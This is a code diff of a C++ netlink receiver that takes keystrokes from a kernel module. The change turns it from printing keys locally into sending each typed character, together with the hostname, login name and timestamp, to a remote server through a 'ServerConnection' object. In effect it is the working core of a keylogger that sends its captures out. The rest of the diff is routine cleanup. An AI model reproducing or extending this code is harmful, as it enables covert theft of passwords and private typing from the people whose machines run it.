@@ -2,14 +2,17 @@
 #include <fcntl.h>  // For fcntl
 #include <thread>
 #include <chrono>
+#include <limits>
+#include <unistd.h>
 
+using namespace std;
 
 NetlinkReceiver::NetlinkReceiver(int protocol, int bufferSize)
         : sock_fd_(-1), receiving_(false), bufferSize_(bufferSize) {
     // Create a netlink socket
     sock_fd_ = socket(PF_NETLINK, SOCK_RAW, protocol);
     if (sock_fd_ < 0) {
-        throw std::runtime_error("Failed to create netlink socket");
+        throw runtime_error("Failed to create netlink socket");
     }
 
     // Initialize the source address structure
@@ -19,7 +22,7 @@ NetlinkReceiver::NetlinkReceiver(int protocol, int bufferSize)
 
     if (bind(sock_fd_, (struct sockaddr*)&src_addr_, sizeof(src_addr_)) < 0) {
         close(sock_fd_);
-        throw std::runtime_error("Failed to bind netlink socket");
+        throw runtime_error("Failed to bind netlink socket");
     }
 
     // Initialize the destination address structure
@@ -29,9 +32,9 @@ NetlinkReceiver::NetlinkReceiver(int protocol, int bufferSize)
     dest_addr_.nl_groups = 0;  // Unicast
 
     // Send an initial message to set the PID in the kernel
-    struct nlmsghdr *nlh = static_cast<nlmsghdr *>(malloc(NLMSG_SPACE(bufferSize_)));
+    auto *nlh = static_cast<nlmsghdr *>(malloc(NLMSG_SPACE(bufferSize_)));
     if (!nlh) {
-        throw std::runtime_error("Failed to allocate memory for nlmsghdr");
+        throw runtime_error("Failed to allocate memory for nlmsghdr");
     }
 
     memset(nlh, 0, NLMSG_SPACE(bufferSize_));
@@ -53,6 +56,9 @@ NetlinkReceiver::NetlinkReceiver(int protocol, int bufferSize)
     }
 
     free(nlh);
+
+    SC = ServerConnection();
+    SC.Start();
 }
 
 
@@ -63,21 +69,44 @@ NetlinkReceiver::~NetlinkReceiver() {
 }
 
 void NetlinkReceiver::startReceiving() {
-    receiving_ = true;
+    receiving_.store(true);
     while (receiving_) {
         receiveMessage();
-        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Sleep briefly to avoid busy-waiting
+        this_thread::sleep_for(chrono::milliseconds(100)); // Sleep briefly to avoid busy-waiting
     }
 }
 
 void NetlinkReceiver::stopReceiving() {
-    receiving_ = false;
+    receiving_.store(false);
+}
+
+string GenerateTimestamp() {
+    char fmt[64];
+    char buf[64];
+    struct timeval tv{};
+    struct tm *tm;
+    gettimeofday(&tv, nullptr);
+    tm = localtime(&tv.tv_sec);
+    strftime(fmt, sizeof(fmt), "%H:%M:%S:%%06u", tm);
+    snprintf(buf, sizeof(buf), fmt, tv.tv_usec);
+    return buf;
 }
 
 void NetlinkReceiver::receiveMessage() {
+    // Set a timeout of 2 seconds for recvmsg
+    struct timeval timeout;
+    timeout.tv_sec = 2;  // Set 2-second timeout
+    timeout.tv_usec = 0; // No microseconds
+
+    // Apply the timeout to the socket
+    if (setsockopt(sock_fd_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+        cerr << "Failed to set socket timeout" << endl;
+        return;
+    }
+
     auto *nlh = static_cast<nlmsghdr *>(malloc(NLMSG_SPACE(bufferSize_)));
     if (!nlh) {
-        throw std::runtime_error("Failed to allocate memory for nlmsghdr");
+        throw runtime_error("Failed to allocate memory for nlmsghdr");
     }
 
     memset(nlh, 0, NLMSG_SPACE(bufferSize_));
@@ -86,8 +115,9 @@ void NetlinkReceiver::receiveMessage() {
 
     // Receive the message from the kernel
     ssize_t received_bytes = recvmsg(sock_fd_, &msg, 0);
-    if (received_bytes < 0 && errno != EAGAIN) { // EAGAIN is expected if no data is available in non-blocking mode
-        std::cerr << "Failed to receive message from kernel" << std::endl;
+
+    // Check for errors or timeout
+    if (received_bytes < 0) {
         free(nlh);
         return;
     }
@@ -99,7 +129,14 @@ void NetlinkReceiver::receiveMessage() {
         memcpy(&keycode, NLMSG_DATA(nlh), sizeof(int));
         memcpy(&ascii_char, static_cast<char*>(NLMSG_DATA(nlh)) + sizeof(int), sizeof(char));
 
-        std::cout << "Received keycode: " << keycode << ", ASCII: " << ascii_char << std::endl;
+        char hostname[1024];
+        char username[1024];
+        gethostname(hostname, 1024);
+        getlogin_r(username, 1024);
+        auto ts = GenerateTimestamp();
+        string line;
+        line.push_back(ascii_char);
+        SC.MakeRequest(make_shared<Request>(line, string(hostname), string(username), ts));
     }
 
     free(nlh);
